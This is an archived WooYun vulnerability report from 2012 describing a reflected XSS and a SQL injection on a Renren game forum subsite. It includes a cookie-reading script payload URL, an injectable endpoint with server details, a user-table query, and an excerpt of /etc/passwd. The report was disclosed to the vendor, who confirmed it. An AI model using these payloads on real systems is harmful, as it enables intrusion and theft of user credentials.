@@ -1,0 +1,232 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		人人网分站SQL注入+反射型xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		人人网分站SQL注入+反射型xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/upload">upload</a> 
+</li><li>提交时间：		2012-09-21 23:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-09-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-09-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-10-12：	细节向普通白帽子公开<br/>
+									2012-10-22：	细节向实习白帽子公开<br/>
+									2012-11-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">1.人人某bbs<br />
+2.反射型跨站，可获取cookie<br />
+3.sql注入,多个注入点，information_schema.columns可用，注入很方便<br />
+4.很多个数据表，select count(*) from XXX_用户表,结果：43998<br />
+5.可读取系统文件，例如/etc/passwd(其他的路径没找到)</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">起因是发现人人网某分站的phpinfo()（这个没有找到其他什么）<br />
+<br />
+</p><pre><code>http://yxzb4.renren.com/index.php</code></pre><p class='detail'><br />
+<br />
+结果发现，wooyun里面有提交了的，只是没处理<br />
+<br />
+</p><pre><code> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-07040">WooYun: 人人网phpinfo信息泄露</a> </code></pre><p class='detail'><br />
+<br />
+结果偶然间，爬行到另外一个站,是一个游戏论坛<br />
+<br />
+</p><pre><code>http://yxzb.renren.com/bbs/</code></pre><p class='detail'><br />
+<br />
+发现存在反射型xss，可获取cookie<br />
+<br />
+</p><pre><code>http://yxzb.renren.com/bbs/viewthread.jsp<br />
+?extra=&lt;script&gt;document.write(document.cookie)&lt;/script&gt; <br />
+&amp;tid=9525</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/2121584710abd9a366116fe1c1dd3a108f645b3e.png" target="_blank"><img src="../images/2121584710abd9a366116fe1c1dd3a108f645b3e.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+其中几个页面都存在注入，其中一个注入信息:<br />
+<br />
+</p><pre><code>Target: 		http://yxzb.renren.com/bbs/faq.jsp?action=message&amp;id=24<br />
+Host IP:		111.1.20.155<br />
+Web Server: 	Apache-Coyote/1.1<br />
+DB Server: 	MySQL &gt;=5<br />
+Current DB: 	jsprun</code></pre><p class='detail'><br />
+<br />
+可查看系统信息：<br />
+<br />
+</p><p class="detail"><a href="../images/21215240f899e77de848c0cd5cd6b3b5065c819a.png" target="_blank"><img src="../images/21215240f899e77de848c0cd5cd6b3b5065c819a.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入的信息：<br />
+<br />
+好多个数据库:<br />
+<br />
+</p><p class="detail"><a href="../images/21223743f71c46647a1f8b112d6f2e8edc36b04d.png" target="_blank"><img src="../images/21223743f71c46647a1f8b112d6f2e8edc36b04d.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+执行查询语句，查询用户，43998（网站上显示信息：主题: 31695, 帖子: 304040, 会员: 43998）<br />
+<br />
+</p><pre><code>select count(*) from  jrun_members</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/212233239eb560f23ab815f0219d645c2873e4da.png" target="_blank"><img src="../images/212233239eb560f23ab815f0219d645c2873e4da.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+用户名，密码，邮箱，salt....<br />
+<br />
+</p><p class="detail"><a href="../images/2122243285418172c84206e70ca9697da5a211e0.png" target="_blank"><img src="../images/2122243285418172c84206e70ca9697da5a211e0.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+读取/etc/passwd<br />
+<br />
+</p><pre><code>root:x:0:0:root:/root:/bin/bash<br />
+bin:x:1:1:bin:/bin:/sbin/nologin<br />
+daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />
+adm:x:3:4:adm:/var/adm:/sbin/nologin<br />
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />
+sync:x:5:0:sync:/sbin:/bin/sync<br />
+...略</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>未测试是否可以拿到shell</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">很早的站了么--！全面修修吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/upload" title="upload">upload</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012549" title="人人网分站SQL注入+反射型xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-09-22 12:11</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12549";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
